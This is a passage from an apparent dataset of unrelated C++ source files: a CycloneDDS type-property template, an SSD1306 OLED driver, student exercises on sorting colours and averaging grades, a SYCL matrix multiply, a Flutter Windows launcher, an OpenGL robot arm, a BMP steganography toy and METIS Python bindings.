<< \", angle_set: \" << rhs.angle_set();\n  os << \", force_set: \" << rhs.force_set();\n  os << \", speed_set: \" << rhs.speed_set();\n  os << \", mode: \" << rhs.mode();\n  os << \"]\";\n  return os;\n}\n\n} //namespace inspire\n\nnamespace org{\nnamespace eclipse{\nnamespace cyclonedds{\nnamespace core{\nnamespace cdr{\n\ntemplate<>\npropvec &get_type_props<::inspire::inspire_hand_ctrl>() {\n  static thread_local std::mutex mtx;\n  static thread_local propvec props;\n  static thread_local entity_properties_t *props_end = nullptr;\n  static thread_local std::atomic_bool initialized {false};\n  key_endpoint keylist;\n  if (initialized.load(std::memory_order_relaxed)) {\n    auto ptr = props.data();\n    while (ptr < props_end)\n      (ptr++)->is_present = false;\n    return props;\n  }\n  std::lock_guard<std::mutex> lock(mtx);\n  if (initialized.load(std::memory_order_relaxed)) {\n    auto ptr = props.data();\n    while (ptr < props_end)\n      (ptr++)->is_present = false;\n    return props;\n  }\n  props.clear();\n\n  props.push_back(entity_properties_t(0, 0, false, bit_bound::bb_unset, extensibility::ext_final));  //root\n  props.push_back(entity_properties_t(1, 0, false, bit_bound::bb_unset, extensibility::ext_final, false));  //::pos_set\n  props.push_back(entity_properties_t(1, 1, false, bit_bound::bb_unset, extensibility::ext_final, false));  //::angle_set\n  props.push_back(entity_properties_t(1, 2, false, bit_bound::bb_unset, extensibility::ext_final, false));  //::force_set\n  props.push_back(entity_properties_t(1, 3, false, bit_bound::bb_unset, extensibility::ext_final, false));  //::speed_set\n  props.push_back(entity_properties_t(1, 4, false, get_bit_bound<int8_t>(), extensibility::ext_final, false));  //::mode\n\n  entity_properties_t::finish(props, keylist);\n  props_end = props.data() + props.size();\n  initialized.store(true, std::memory_order_release);\n  return props;\n}\n\n} //namespace cdr\n} //namespace core\n} //namespace cyclonedds\n} //namespace eclipse\n} //namespace org\n\n",
    "/*\n  06/01/2016\n  Author: Makerbro\n  Platforms: ESP8266\n  Language: C++\n  File: ACROBOTIC_SSD1306.cpp\n  ------------------------------------------------------------------------\n  Description:\n  SSD1306 OLED Driver Library.\n  ------------------------------------------------------------------------\n  Please consider buying products from ACROBOTIC to help fund future\n  Open-Source projects like this! We'll always put our best effort in every\n  project, and release all our design files and code for you to use.\n  https://acrobotic.com/\n  ------------------------------------------------------------------------\n  License:\n  Released under the MIT license. Please check LICENSE.txt for more\n  information.  All text above must be included in any redistribution.\n*/\n\n#include \"ACROBOTIC_SSD1306.h\"\n\nvoid ACROBOTIC_SSD1306::init(SoftWire& wire)\n{\n  m_wire = &wire;\n  displayOff();                 //display off\n  sendCommand(0xA6);            //Set Normal Display (default)\n  displayOff();                 //display off\n  sendCommand(0xD5);            //SETDISPLAYCLOCKDIV\n  sendCommand(0x80);            // the suggested ratio 0x80\n  sendCommand(0xA8);            //SSD1306_SETMULTIPLEX\n  sendCommand(SSD1306_Max_Y);\n  sendCommand(0xD3);            //SETDISPLAYOFFSET\n  sendCommand(0x0);             //no offset\n  sendCommand(0x40|0x0);        //SETSTARTLINE\n  sendCommand(0x8D);            //CHARGEPUMP\n  sendCommand(0x14);\n  sendCommand(0x20);            //MEMORYMODE\n  sendCommand(0x00);            //0x0 act like ks0108\n  sendCommand(0xA1);            //SEGREMAP   Mirror screen horizontally (A0)\n  sendCommand(0xC8);            //COMSCANDEC Rotate screen vertically (C0)\n  sendCommand(0xDA);            //0xDA\n  sendCommand(0x12);            //COMSCANDEC\n  sendCommand(0x81);            //SETCONTRAST\n  sendCommand(0xCF);            //\n  sendCommand(0xd9);            //SETPRECHARGE\n  sendCommand(0xF1);\n  sendCommand(0xDB);            //SETVCOMDETECT\n  sendCommand(0x40);\n  sendCommand(0xA4);            //DISPLAYALLON_RESUME\n  sendCommand(0xA6);            //NORMALDISPLAY\n  clearDisplay();\n  sendCommand(0x2E);            //Stop scroll\n  sendCommand(0x20);            //Set Memory Addressing Mode\n  sendCommand(0x00);            //Set Memory Addressing Mode ab Horizontal addressing mode\n  setFont(font8x8);\n}\n\nvoid ACROBOTIC_SSD1306::displayOn()\n{\n    sendCommand(0xAF);\n}\n\nvoid ACROBOTIC_SSD1306::displayOff()\n{\n    sendCommand(0xAE);\n}\n\nvoid ACROBOTIC_SSD1306::setFont(const uint8_t* font, bool inverse)\n{\n  m_font = font;\n  m_inverse=inverse;\n  m_font_width = pgm_read_byte(&m_font[0]);\n}\n\nvoid ACROBOTIC_SSD1306::sendCommand(unsigned char command)\n{\n  m_wire->beginTransmission(SSD1306_Address);    // begin I2C communication\n  m_wire->write(SSD1306_Command_Mode);           // Set OLED Command mode\n  m_wire->write(command);\n  m_wire->endTransmission();                       // End I2C communication\n}\n\nvoid ACROBOTIC_SSD1306::setBrightness(unsigned char Brightness)\n{\n   sendCommand(SSD1306_Set_Brightness_Cmd);\n   sendCommand(Brightness);\n}\n\nvoid ACROBOTIC_SSD1306::setHorizontalMode()\n{\n    addressingMode = HORIZONTAL_MODE;\n    sendCommand(0x20);                      //set addressing mode\n    sendCommand(0x00);                      //set horizontal addressing mode\n}\n\nvoid ACROBOTIC_SSD1306::setPageMode()\n{\n    addressingMode = PAGE_MODE;\n    sendCommand(0x20);                      //set addressing mode\n    sendCommand(0x02);                      //set page addressing mode\n}\n\nvoid ACROBOTIC_SSD1306::setTextXY(unsigned char row, unsigned char col)\n{\n    sendCommand(0xB0 + row);                          //set page address\n    sendCommand(0x00 + (m_font_width*col & 0x0F));    //set column lower addr\n    sendCommand(0x10 + ((m_font_width*col>>4)&0x0F)); //set column higher addr\n}\n\nvoid ACROBOTIC_SSD1306::clearDisplay()\n{\n  unsigned char i,j;\n  sendCommand(SSD1306_Display_Off_Cmd);     //display off\n  for(j=0;j<8;j++)\n  {\n    setTextXY(j,0);\n    {\n      for(i=0;i<16;i++)  //clear all columns\n      {\n        putChar(' ');\n      }\n    }\n  }\n  sendCommand(SSD1306_Display_On_Cmd);     //display on\n  setTextXY(0,0);\n}\n\nvoid ACROBOTIC_SSD1306::sendData(unsigned char Data)\n{\n     m_wire->beginTransmission(SSD1306_Address); // begin I2C transmission\n     m_wire->write(SSD1306_Data_Mode);            // data mode\n     m_wire->write(m_inverse?~Data:Data);\n     m_wire->endTransmission();                    // stop I2C transmission\n}\n\nbool ACROBOTIC_SSD1306::putChar(unsigned char ch)\n{\n    if (!m_font) return 0;\n    //Ignore non-printable ASCII characters. This can be modified for\n    //multilingual font.\n    if(ch < 32 || ch > 127)\n    {\n        ch = ' ';\n    }\n    for(unsigned char i=0;i<m_font_width;i++)\n    {\n       // Font array starts at 0, ASCII starts at 32\n       sendData(pgm_read_byte(&m_font[(ch-32)*m_font_width+m_font_offset+i]));\n    }\n    return 1;\n}\n\nvoid ACROBOTIC_SSD1306::putString(const char *string)\n{\n    unsigned char i=0;\n    while(string[i])\n ",
    "// B\u00e0i 1: Nh\u1eadp v\u00e0o n \u0111\u1ed1i t\u01b0\u1ee3ng c\u00f3 m\u00e0u \u0111\u1ecf (red), tr\u1eafng (white) v\u00e0 xanh (blue), s\u1eafp x\u1ebfp theo tr\u1eadt t\u1ef1 nh\u01b0 sau:\r\n// c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng c\u00f9ng m\u00e0u n\u1eb1m k\u1ebf ti\u1ebfp nhau v\u00e0 theo th\u1ee9 t\u1ef1 \u0111\u1ecf, tr\u1eafng, xanh.\r\n// Input {xanh, \u0111\u1ecf, xanh, \u0111\u1ecf, \u0111\u1ecf, tr\u1eafng, \u0111\u1ecf, xanh, tr\u1eafng}\r\n// Output {\u0111\u1ecf, \u0111\u1ecf, \u0111\u1ecf, \u0111\u1ecf, tr\u1eafng, tr\u1eafng, xanh, xanh, xanh}\r\n#include <iostream>\r\n#include <vector>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\nvector<string> sortColors(vector<string> colors) {\r\n    unordered_map<string, int> colorMap;\r\n    colorMap[\"\u0111\u1ecf\"] = 0;\r\n    colorMap[\"tr\u1eafng\"] = 1;\r\n    colorMap[\"xanh\"] = 2;\r\n\r\n    int colorCounts[3] = {0, 0, 0};\r\n    for (vector<string>::iterator it = colors.begin(); it != colors.end(); ++it) {\r\n        colorCounts[colorMap[*it]]++;\r\n    }\r\n    vector<string> output;\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < colorCounts[i]; j++) {\r\n            if (i == 0) output.push_back(\"\u0111\u1ecf\");\r\n            else if (i == 1) output.push_back(\"tr\u1eafng\");\r\n            else output.push_back(\"xanh\");\r\n        }\r\n    }\r\n    return output;\r\n}\r\n\r\nint main() {\r\n    vector<string> inputColors;\r\n    inputColors.push_back(\"xanh\");\r\n    inputColors.push_back(\"\u0111\u1ecf\");\r\n    inputColors.push_back(\"xanh\");\r\n    inputColors.push_back(\"\u0111\u1ecf\");\r\n    inputColors.push_back(\"\u0111\u1ecf\");\r\n    inputColors.push_back(\"tr\u1eafng\");\r\n    inputColors.push_back(\"\u0111\u1ecf\");\r\n    inputColors.push_back(\"xanh\");\r\n    inputColors.push_back(\"tr\u1eafng\");\r\n\r\n    vector<string> outputColors = sortColors(inputColors);\r\n    for (vector<string>::iterator it = outputColors.begin(); it != outputColors.end(); ++it) {\r\n        cout << *it << \" \";\r\n    }\r\n    cout << endl;\r\n    return 0;\r\n}",
    "#include <cassert>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n#include <iostream>\n\n#include <sycl/sycl.hpp>\n\nusing namespace sycl;\n\nusing buffer_f = buffer<float, 1>;\n\nint main(int argc, char *argv[]) {\n  //! [create_host_vectors]\n  const uint32_t     N = (argc > 1 ? atoi(argv[1]) : 1024);\n  std::vector<float> A(N * N), B(N * N), C(N * N);\n  //! [create_host_vectors]\n\n  //! [create_sycl_buffer]\n  buffer_f buf_a{A.data(), range<1>{A.size()}};\n  buffer_f buf_b{B.data(), range<1>{B.size()}};\n  buffer_f buf_c{C.data(), range<1>{C.size()}};\n  //! [create_sycl_buffer]\n\n  std::srand((unsigned int)std::time(nullptr));\n  //! [initialize_host_vector]\n  {\n    host_accessor acc_a{buf_a, write_only};\n    host_accessor acc_b{buf_b, write_only};\n    for (uint32_t i = 0; i < N * N; i++) {\n      acc_a[i] = (std::rand() % 100) / 100.0;\n      acc_b[i] = (std::rand() % 100) / 100.0;\n    }\n  }\n  //! [initialize_host_vector]\n\n  queue q;\n  q.submit([&](handler &h) {\n     //! [accessor]\n     accessor acc_a{buf_a, h, read_only};\n     accessor acc_b{buf_b, h, read_only};\n     accessor acc_c{buf_c, h, write_only, no_init};\n     //! [accessor]\n\n     //! [kernel]\n     h.parallel_for(range<2>{N, N}, [=](id<2> idx) {\n       float sum = 0;\n       for (uint32_t k = 0; k < N; k++)\n         sum += acc_a[idx[0] * N + k] * acc_b[k * N + idx[1]];\n       acc_c[idx[0] * N + idx[1]] = sum;\n     });\n     //! [kernel]\n   }).wait();\n\n  {\n    host_accessor acc_a{buf_a, read_only};\n    host_accessor acc_b{buf_b, read_only};\n    host_accessor acc_c{buf_c, read_only};\n    for (uint32_t i = 0; i < N; i++) {\n      for (uint32_t j = 0; j < N; j++) {\n        float sum = 0;\n        for (uint32_t k = 0; k < N; k++)\n          sum += acc_a[i * N + k] * acc_b[k * N + j];\n        assert(std::fabs((sum - acc_c[i * N + j]) / sum) < 1e-6);\n      }\n    }\n  }\n\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"splash_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GL/freeglut_std.h>\n#include <GL/glut.h>\n\nGLfloat camX = 20.0f, camY = 20.0f, camZ = 20.0f; // Posici\u00f3n inicial de la c\u00e1mara\n\nGLUquadricObj *p = gluNewQuadric();\nfloat angTronco = 0;\nfloat angBrazo11 = 0;\nfloat angBrazo12 = 0;\nfloat angBrazo13 = 0;\nfloat angBrazo14 = 0;\nfloat angEsf1 = 0;\nfloat angEsf2 = 0;\nfloat angEsf3 = 0;\n\n\nvoid inicializar()\n{\n    glClearColor(0.7,0.7,0.7,0.0);\n    glEnable(GL_DEPTH_TEST);\n    gluQuadricDrawStyle(p,GLU_LINE);\n}\n\nvoid graficarEjes()\n{\n    glColor3f(0,0,0);\n    glBegin(GL_LINES);\n        glColor3f(1,0,0);\n        glVertex3f(0,0,0);\n        glVertex3f(50,0,0);\n\n        glColor3f(0,1,0);\n        glVertex3f(0,0,0);\n        glVertex3f(0,50,0);\n\n        glColor3f(0,0,1);\n        glVertex3f(0,0,0);\n        glVertex3f(0,0,50);\n    glEnd();\n}\n\nvoid graficar()\n{\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n    gluLookAt(camX, camY, camZ, 0, 0, 0, 0, 1, 0);  // Uso de las variables de c\u00e1mara\n\n    graficarEjes();\n\n    // Tronco\n    glPushMatrix();//1\n        glColor3f(1,1,0.5);\n        glRotatef(angTronco,0,1,0);\n        glTranslatef(0,0,0);\n        glScalef(2,1,3);\n        glutSolidCube(4);\n\n        // Brazo 1.1\n        glPushMatrix();//1\n            glColor3f(0.5,0.3,0.5);\n            glTranslatef(0,0.9,1);\n            glRotatef(angBrazo11,1,0,0);\n            glRotatef(-75,1,0,0);\n            gluCylinder(p, 0.5, 0.5, 10, 16, 16);\n\n            glPushMatrix();//2 esfera\n                glTranslatef(0,0,10);\n                glRotatef(angEsf1, 0,0,1);\n                glutWireSphere(0.5,16,16);\n\n                glPushMatrix();//3\n                // BRazo 1.2\n                    glColor3f(0,1,0);\n                    glTranslatef(0,0,0);\n                    glRotatef(angBrazo12,1,0,0);\n                    glRotatef(45,1,0,0);\n                    gluCylinder(p, 0.5, 0.5, 5, 16, 16);\n\n                    glPushMatrix();//4 esfera\n                        glTranslatef(0,0,5);\n                        glRotatef(angEsf2, 0, 0, 1);\n                        glutWireSphere(0.5,16,16);\n\n                        glPushMatrix();//5\n                        //BRazo1.3\n                            glColor3f(0,0,1);\n                            glTranslatef(0,0,0);\n                            glRotatef(90,1,0,0);\n                            glRotatef(angBrazo13, 1, 0, 0);\n                            gluCylinder(p, 0.5, 0.5, 4, 16, 16);\n\n                            glPushMatrix();//6\n                                glTranslatef(0,0,4);\n                                glRotatef(angEsf3, 0, 0, 1);\n                                glutWireSphere(0.5,16,16);\n                                glPushMatrix();//brazo 1.4\n                                    glTranslatef(0,0,0);\n                                    glRotatef(90,1,0,0);\n                                    glScalef(0.5,0.5,0.5);\n                                    glRotatef(angBrazo14, 1, 0, 0);\n                                    gluCylinder(p, 0.5, 0.5, 4, 16, 16);\n                                glPopMatrix();\n                            glPopMatrix();//acaba el 6\n\n                        glPopMatrix();//acaba el 5\n                    glPopMatrix();//acaba el 4\n                glPopMatrix();//acaba el 3\n            glPopMatrix();//acaba el 2\n\n        glPopMatrix();//acaba el 1\n\n        // Brazo 2.1\n        glPushMatrix();\n        glPopMatrix();\n    glPopMatrix();\n\n    glutSwapBuffers();\n}\n\nvoid redimensionar(int w, int h)\n{\n    glViewport(0,0,w,h);\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluPerspective(45.0,(float)w/(float)h,1,100);\n}\n\n// Funci\u00f3n para mover la c\u00e1mara con las teclas z, x, c, v, w, q\nvoid moverCamara(unsigned char key, int x, int y)\n{\n    switch (key) {\n        case 'z':  //camara\n            camZ -= 1.0f;\n            break;\n        case 'x':\n            camZ += 1.0f;\n            break;\n        case 'c':\n            camY += 1.0f;\n            break;\n        case 'v':\n            camY -= 1.0f;\n            break;\n        case 'w':\n            camX -= 1.0f;\n            break;\n        case 'q':   //camara\n            camX += 1.0f;\n            break;\n        case 'a':\n            angTronco -= 5;\n        break;\n        case 's':\n            angTronco += 5;\n        break;\n        case 'e':\n            angEsf1 -= 5;\n        break;\n        case 'r':\n            angEsf1 += 5;\n        break;\n        case 'd':\n            angBrazo11 += 2.5;\n        break;\n        case 'f':\n            angBrazo11 -= 2.5;\n        break;\n        case 'g':\n            angBrazo12 +=2.5;\n        break;\n        case 'h':\n            angBrazo12 -=2.5;\n        break;\n        case 't':\n            angEsf2 -= 5;\n        break;\n        case 'y':\n            angEsf2 +=5;\n        break;\n        case 'j':\n            angBrazo13 -= 2.5;\n        break;\n        case 'k':\n            angBrazo13 += 2.5;\n        break;\n        case 'u':\n            angEsf3 -= 5;\n        break;\n        case 'i':\n",
    "#include <iostream>\n#include <iomanip>\n#include <vector>\n#include <array>\n\nusing namespace std;\n// partie 1\nvoid saisirNotes(vector<double>& v, int n) {\n\tdouble note;\n\tfor (int i = 0; i < n; ++i) {\n\t\tcout << \"Entrer la note de l'etudiant \" << i + 1 << \" :\";\n\t\tcin >> note;\n\t\tv.push_back(note);\n\t}\n}\nvoid afficherNotes(const vector<double>& v) {\n\t\n\tfor (size_t i = 0; i < v.size(); ++i) {\n\t\tcout << v[i] << \" \";\n\t}\n\tcout << endl;\n}\n\ndouble calculerMoyenne(const vector<double>& v) {\n\tdouble m = 0;\n\tfor (size_t i = 0; i < v.size(); i++) {\n\t\tm += v[i];\n\t}\n\treturn m / v.size();\n}\ndouble trouverNoteMaximale(const vector<double>& v) {\n\tdouble max = 0;\n\tfor (size_t i = 0; i < v.size(); i++) {\n\t\tif (v[i] > max)\n\t\t\tmax = v[i];\n\n\t}\n\treturn max;\n}\nvoid ajouterNotes(vector<double>& v, int n) {\n\tsaisirNotes(v, n);\n}\nint main_p1() {\n\t\n\tint N1, N2;\n\tvector<double> notes;\n\t// Saisie des notes initiales\n\tcout << \"Combien d'etudiants dans la classe initiale ? \";\n\tcin >> N1;\n\tsaisirNotes(notes, N1);\n\t// Affichage des notes\n\tafficherNotes(notes);\n\t// Calcul et affichage de la moyenne des notes\n\tdouble moyenne = calculerMoyenne(notes);\n\tcout << \"Moyenne des notes : \" << fixed << setprecision(2) <<\n\t\tmoyenne << endl;\n\t// Recherche et affichage de la note maximale\n\tdouble noteMax = trouverNoteMaximale(notes);\n\tcout << \"Note maximale : \" << noteMax << endl;\n\t// Ajout des notes des nouveaux etudiants\n\tcout << \"Combien de nouveaux etudiants rejoignent la classe ?\";\n\tcin >> N2;\n\tajouterNotes(notes, N2);\n\t// Affichage des notes apres ajout\n\tafficherNotes(notes);\n\t// Recalcul et affichage de la nouvelle moyenne des notes\n\tmoyenne = calculerMoyenne(notes);\n\tcout << \"Nouvelle moyenne des notes : \" << moyenne << endl;\n\t// Recherche et affichage de la nouvelle note maximale\n\tnoteMax = trouverNoteMaximale(notes);\n\tcout << \"Nouvelle note maximale : \" << noteMax << endl;\n\treturn 0;\n}\n// partie 2\n\n\n\n\nconst int N1 = 5;\nconst int N2 = 3;\n\nvoid saisirNotes(array<double,N1>& arr, int& count ) {\n\t\n\tfor (int i = 0; i < N1; i++) {\n\t\tcout << \"Entrer la note de l'etudiant \" << i + 1 << \" :\";\n\t\tcin >> arr[i];\n\t\tcount++;\n\t}\n\t\n\n}\n\nvoid etendreTableau(const array<double, N1>& arr1, array<double, N1 + N2>& arr2, int& count) {\n\tfor (int i = 0; i < N1; ++i) {\n\t\tarr2[i] = arr1[i];\n\t\n\t}\n}\n\nvoid afficherNotes(const array<double, N1 + N2>& arr, int count) {\n\tfor (int i = 0; i < count; i++) {\n\t\tcout << arr[i] << \" \";\n\t}\n\tcout << endl;\n}\nvoid ajouterNotes(array < double, N1 + N2>& notesEtendues, int& count) {\n\tfor (int i = N1; i < N1+N2; i++) {\n\t\tcout << \"Entrer la note de l'etudiant \" << i+1 << \" :\";\n\t\tcin >> notesEtendues[i];\n\t\tcount++;\n\t}\n\t\n}\ndouble calculerMoyenne(const array<double, N1 + N2>& arr, int count) {\n\tdouble m = 0;\n\tfor (size_t i = 0; i < count; i++) {\n\t\tm += arr[i];\n\t}\n\treturn m / count;\n}\ndouble trouverNoteMaximale(const array<double, N1 + N2>& arr, int count) {\n\tdouble max = 0;\n\tfor (size_t i = 0; i < count; i++) {\n\t\tif (arr[i] > max)\n\t\t\tmax = arr[i];\n\t}\n\treturn max;\n}\n\nint main() {\n\tarray<double, N1> notesInitiales = { 0 };\n\tint count = 0; // contient le nombre d\u2019etudiants saisi\n\t// Saisie des notes initiales\n\tcout << \"Saisie des notes des \" << N1 << \" etudiants de la classe initiale.\" << endl;\n\t\tsaisirNotes(notesInitiales, count);\n\t// Extension du tableau pour inclure les nouveaux\tetudiants\n\t\tarray<double, N1 + N2> notesEtendues = { 0 };\n\tetendreTableau(notesInitiales, notesEtendues, count);\n\t// Affichage des notes\n\tafficherNotes(notesEtendues, count);\n\t// Calcul et affichage de la moyenne des notes\n\tdouble moyenne = calculerMoyenne(notesEtendues, count);\n\tcout << \"Moyenne des notes : \" << fixed << setprecision(2)\n\t\t<< moyenne << endl;\n\t// Recherche et affichage de la note maximale\n\tdouble noteMax = trouverNoteMaximale(notesEtendues,count);\n\tcout << \"Note maximale : \" << noteMax << endl;\n\t// Ajout des notes des nouveaux etudiants\n\tcout << \"Saisie des notes des \" << N2 << \" nouveaux etudiants.\" << endl;\n\t\tajouterNotes(notesEtendues, count);\n\t \n\t\t// Affichage des notes apres ajout\n\t\tafficherNotes(notesEtendues, count);\n\t// Recalcul et affichage de la nouvelle moyenne des notes\n\tmoyenne = calculerMoyenne(notesEtendues, count);\n\tcout << \"Nouvelle moyenne des notes : \" << moyenne << \t\tendl;\n\t// Recherche et affichage de la nouvelle note maximale\n\tnoteMax = trouverNoteMaximale(notesEtendues, count);\n\tcout << \"Nouvelle note maximale : \" << noteMax << endl;\n\treturn 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <bitset>\r\n#include <limits>\r\nusing namespace std;\r\n\r\nvoid setLSB(char &byte, int bit) {\r\n    byte = (byte & 0xFE) | (bit & 1);\r\n}\r\n\r\nint getLSB(char byte) {\r\n    return byte & 1;\r\n}\r\n\r\nvoid encodeMessageInImage(const string &imageFile, const string &message, const string &outputFile) {\r\n    ifstream image(imageFile, ios::binary);\r\n    ofstream output(outputFile, ios::binary);\r\n\r\n    if (!image.is_open() || !output.is_open()) {\r\n        cerr << \"Error opening file!\" << endl;\r\n        return;\r\n    }\r\n\r\n    char header[54];\r\n    image.read(header, 54);\r\n    output.write(header, 54);\r\n\r\n    string binaryMessage;\r\n    for (char c : message) {\r\n        binaryMessage += bitset<8>(c).to_string();\r\n    }\r\n\r\n    binaryMessage += \"00000000\";\r\n\r\n    char pixel;\r\n    size_t messageIndex = 0;\r\n\r\n    while (image.get(pixel)) {\r\n        if (messageIndex < binaryMessage.size()) {\r\n            setLSB(pixel, binaryMessage[messageIndex] - '0');\r\n            messageIndex++;\r\n        }\r\n        output.put(pixel);\r\n    }\r\n\r\n    image.close();\r\n    output.close();\r\n\r\n    cout << \"Message encoded in \" << outputFile << endl;\r\n}\r\n\r\nstring decodeMessageFromImage(const string &imageFile) {\r\n    ifstream image(imageFile, ios::binary);\r\n\r\n    if (!image.is_open()) {\r\n        cerr << \"Error opening file!\" << endl;\r\n        return \"\";\r\n    }\r\n\r\n    image.seekg(54);\r\n\r\n    string binaryMessage;\r\n    char pixel;\r\n    string message;\r\n\r\n    while (image.get(pixel)) {\r\n        binaryMessage += to_string(getLSB(pixel));\r\n\r\n        if (binaryMessage.size() == 8) {\r\n            char decodedChar = bitset<8>(binaryMessage).to_ulong();\r\n            if (decodedChar == '\\0') {\r\n                break;\r\n            }\r\n            message += decodedChar;\r\n            binaryMessage.clear();\r\n        }\r\n    }\r\n    image.close();\r\n    return message;\r\n}\r\n\r\nint main() {\r\n    string imageFile = \"input.bmp\";\r\n    string outputFile = \"output.bmp\";\r\n    string message;\r\n    int choice;\r\n    do {\r\n        printf(\"1. Encode\\n2. Decode\\n3. Exit\\n\");\r\n        printf(\"Enter choice: \");\r\n        if (!(cin >> choice)) {\r\n            cout << \"Invalid input! Please enter a number.\" << endl;\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            continue;\r\n        }    \r\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n        switch(choice) {\r\n            case 1:\r\n                printf(\"Enter message: \");\r\n                getline(cin,  message);\r\n                encodeMessageInImage(imageFile, message, outputFile);\r\n                break;\r\n            case 2:\r\n                cout << \"The message in the image is: \" << decodeMessageFromImage(outputFile) << endl;\r\n                break;\r\n            case 3:\r\n                printf(\"Thank you!\\n\");\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice!\" << endl;\r\n        }\r\n    } while(choice != 3);\r\n    return 0;\r\n}",
    "// METIS bindings for Python using Nanobind\n\n#include <metis.h>\n#include <nanobind/nanobind.h>\n#include <nanobind/ndarray.h>\n#include <nanobind/stl/pair.h>\n\nnamespace nb = nanobind;\nusing namespace nb::literals;\n\nusing IdxA = nb::ndarray<idx_t, nb::shape<-1>, nb::device::cpu>;\nusing RealA = nb::ndarray<real_t, nb::shape<-1>, nb::device::cpu>;\n\n// (Return value, edgecut)\nusing PartGraphRet = std::pair<int, idx_t>;\n\nPartGraphRet PartGraph(idx_t nvtxs, idx_t ncon, idx_t nparts, IdxA xadj,\n                       IdxA adjncy, IdxA vwgt, IdxA vsize, IdxA adjwgt,\n                       RealA tpwgts, RealA ubvec, IdxA options, IdxA part,\n                       int part_kway) {\n  idx_t edgecut = 0;\n\n  idx_t *nvtxs_p = &nvtxs;\n  idx_t *ncon_p = &ncon;\n\n  idx_t *xadj_p = xadj.data();\n  idx_t *adjncy_p = adjncy.data();\n\n  idx_t *vwgt_p = vwgt.size() == 0 ? nullptr : vwgt.data();\n  idx_t *vsize_p = vsize.size() == 0 ? nullptr : vsize.data();\n  idx_t *adjwgt_p = adjwgt.size() == 0 ? nullptr : adjwgt.data();\n\n  idx_t *nparts_p = &nparts;\n\n  real_t *tpwgts_p = tpwgts.size() == 0 ? nullptr : tpwgts.data();\n  real_t *ubvec_p = ubvec.size() == 0 ? nullptr : ubvec.data();\n  idx_t *options_p = options.size() == 0 ? nullptr : options.data();\n\n  idx_t *edgecut_p = &edgecut;\n  idx_t *part_p = part.data();\n\n  int ret;\n  if (part_kway) {\n    ret = METIS_PartGraphKway(nvtxs_p, ncon_p, xadj_p, adjncy_p, vwgt_p,\n                              vsize_p, adjwgt_p, nparts_p, tpwgts_p, ubvec_p,\n                              options_p, edgecut_p, part_p);\n  } else {\n    ret = METIS_PartGraphRecursive(nvtxs_p, ncon_p, xadj_p, adjncy_p, vwgt_p,\n                                   vsize_p, adjwgt_p, nparts_p, tpwgts_p,\n                                   ubvec_p, options_p, edgecut_p, part_p);\n  }\n\n  return PartGraphRet(ret, edgecut);\n}\n\nint NodeND(idx_t nvtxs, IdxA xadj, IdxA adjncy, IdxA vwgt, IdxA options,\n           IdxA perm, IdxA iperm) {\n\n  // std::cout << \"nvtxs = \" << nvtxs << \"\\n\";\n  // std::cout << \"xadj.size() = \" << xadj.size() << \"\\n\";\n  // std::cout << \"adjncy.size() = \" << adjncy.size() << \"\\n\";\n  // std::cout << \"vwgt.size() = \" << vwgt.size() << \"\\n\";\n  // std::cout << \"options.size() = \" << options.size() << \"\\n\";\n  // std::cout << \"perm.size() = \" << perm.size() << \"\\n\";\n  // std::cout << \"iperm.size() = \" << iperm.size() << \"\\n\";\n\n  idx_t *nvtxs_p = &nvtxs;\n  idx_t *xadj_p = xadj.data();\n  idx_t *adjncy_p = adjncy.data();\n  idx_t *vwgt_p = vwgt.size() == 0 ? nullptr : vwgt.data();\n  idx_t *options_p = options.size() == 0 ? nullptr : options.data();\n\n  idx_t *perm_p = perm.data();\n  idx_t *iperm_p = iperm.data();\n\n  // for (int i = 0; i < nvtxs; i++) {\n  //     int start = xadj_p[i];\n  //     int end = xadj_p[i+1];\n  //     for (int j = start; j < end; j++) {\n  //         std::cout << \"edge\" << i << \" \" << adjncy_p[j] << \"\\n\";\n  //     }\n  // }\n\n  return METIS_NodeND(nvtxs_p, xadj_p, adjncy_p, vwgt_p, options_p, perm_p,\n                      iperm_p);\n}\n\nint SetDefaultOptions(IdxA options) {\n  return METIS_SetDefaultOptions(options.data());\n}\n\n#define EXPORT_CONSTANT(m, a) m.attr(#a) = int(METIS_##a)\n\nNB_MODULE(_nbmetis, m) {\n  m.doc() = \"Yet anothor Python binding for METIS\";\n\n  m.attr(\"SIZEOF_IDX_T\") = sizeof(idx_t);\n  m.attr(\"SIZEOF_REAL_T\") = sizeof(real_t);\n\n  EXPORT_CONSTANT(m, VER_MAJOR);\n  EXPORT_CONSTANT(m, VER_MINOR);\n  EXPORT_CONSTANT(m, VER_SUBMINOR);\n\n  